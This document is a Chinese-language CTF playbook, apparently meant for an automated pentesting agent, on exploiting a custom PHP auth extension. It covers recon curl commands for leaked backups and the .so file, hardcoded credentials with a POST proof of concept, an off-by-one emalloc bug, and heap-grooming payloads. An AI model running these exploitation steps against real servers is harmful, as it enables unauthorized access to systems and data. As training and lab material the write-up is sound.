## 0. 何时启用

出现任一指纹：

| 指纹 | 含义 |
|------|------|
| `X-Hint: zend_mm small bins` / `X-Alloc-Bins` / `X-Slab-Size` | 出题人把 zend_mm 当谜面 |
| `X-PHP-Version` + 可下载 `.so` / `custom_auth.so` | 自定义 PHP 扩展 |
| `<!-- debug: input_len=N -->` | 堆 Echo（`strlen` 读分配缓冲） |
| `/index.php.bak` + `custom_auth_verify()` | 认证在扩展里，成功后读 `/flag` |
| POST 字段 `u` + `p`，失败只回 `Authentication Failed` | 登录面即利用面 |

```bash
# 侦察（授权内）
curl -sI "https://<target>/"
curl -s "https://<target>/index.php.bak"
curl -s -o /tmp/custom_auth.so "https://<target>/custom_auth.so"
strings /tmp/custom_auth.so | grep -E 'root\||flag|strcmp|emalloc'
```

## 1. 强制顺序（禁止一上来堆喷）

同一题名可能挂 **多实例、两套二进制**。每实例单独下 `.so`，禁止混用结论。

```
备份源码 / .so
    │
    ├─ strings 出 `user|pass` 且反汇编有 strcmp
    │     → 先 POST 硬编码凭据（简易版一条出 Flag）
    │
    ├─ 有 strcmp 但登录成功、/flag 空
    │     → 环境未挂载 Flag，换隧道/换节点，不是解法错
    │
    └─ 无 strcmp，zif_* 末尾恒 RETURN_FALSE（type_info=2）
          → 进阶版：按 bin 边界测 Echo，再考虑堆元数据
```

1. 拉 `/index.php.bak`、`/custom_auth.so`、常见 `.bak`/`.swp`/`.orig`。  
2. `strings` + 反汇编 `zif_custom_auth_verify`（或同名 `zif_*`）。  
3. **有成功分支就先打凭据**，不要先喷堆。  
4. 每个入口（CF 隧道 / IP:port）单独比 `.so` 哈希与函数长度。  
5. 进阶版再测 off-by-one Echo；堆喷限速，大量请求会 502。

## 2. 两版本分流

| 特征 | 简易版 | 进阶版 |
|------|--------|--------|
| 凭据串 | `root\|super_secure_admin_pwd`（用户名是 **root**，不是 admin） | rodata 可能仍在，**无 strcmp** |
| `zif_*` | 有 `strcmp` → TRUE/FALSE | `efree` 后写 `IS_FALSE(2)`，恒失败 |
| 解法 | `POST u=root&p=super_secure_admin_pwd` | 堆布局 + off-by-one |
| 金标准 Flag | `flag{Heap_0ff_By_0ne_Zend_M4stery}`（平台或要 `CTF{...}`） | 报告时点未闭环 |

简易版 PoC：

```bash
curl -s -X POST "https://<target>/" -d "u=root&p=super_secure_admin_pwd"
# 期望：<!-- debug: input_len=27 -->  + flag{...}
```

## 3. Off-by-one 与堆 Echo

缺陷（金标准）：

```c
buf = emalloc(ulen + plen + 1);          // 少 1
sprintf(buf, "%s|%s", u, p);             // 写 ulen+plen+2（含 \0）
php_printf("<!-- debug: input_len=%zu -->", strlen(buf));
```

| 量 | 公式 |
|----|------|
| 分配 | `emalloc(len(u)+len(p)+1)` |
| 写入 | `len(u)+len(p)+2`（`\|` + `\0`） |
| 正确凭据 | `4+22+1=27` → 落入 **32-byte** small bin |
| 边界触发 | `len(u)+len(p) = bin-1` → 分配恰好 bin，`sprintf` 写 bin+1 |
| Echo 判据 | 边界上 `input_len` **比明文长度 +1**（`strlen` 越界读到邻块） |

zend_mm small bins（响应头会给）：`8,16,24,32,40,48,56,64,80,96,112,128,160,192,224,256,320,...`

```bash
# 32-byte 边界：15+16=31 → emalloc(32) → 写 33 → Echo 常为 32
curl -s -X POST "https://<target>/" \
  -d "u=AAAAAAAAAAAAAAA&p=BBBBBBBBBBBBBBBB"
```

PHP 8.1 zval：`type_info` 在 `+0x08`；`IS_FALSE=2`，`IS_TRUE=3`。进阶版目标是让 `custom_auth_verify` 返回 TRUE，或让 `strlen` 把邻块 `/flag` 漏进响应。

进阶版未闭环路径（按序试，勿盲喷）：

1. 按 `X-Alloc-Bins` 只在 `32/40/48…` 边界 groome。  
2. `ulen+plen=31/39/47…` 触发 `\0` 写穿。  
3. `efree` 时破坏 chunk 元数据，尝试把返回 zval `type_info` 从 2 翻到 3。  
4. 或利用 Echo 的越界 `strlen` 读邻块。

## 4. 成功口径 / 禁止

- 靶场：响应体出现 `flag{` / 约定文件内容，或平台接受的 `CTF{...}`。  
- 只测到 `input_len` +1 **不算**拿下，只算漏洞确认。  
- 登录成功但无 Flag → 记「环境未挂载」，换实例，不改结论为凭据无效。  
- **禁止**把堆喷当默认第一步；**禁止**把 Spring heapdump 卡套到本题。  
- 生产授权站：备份/.so 泄露按信息泄露结案；堆破坏先问。
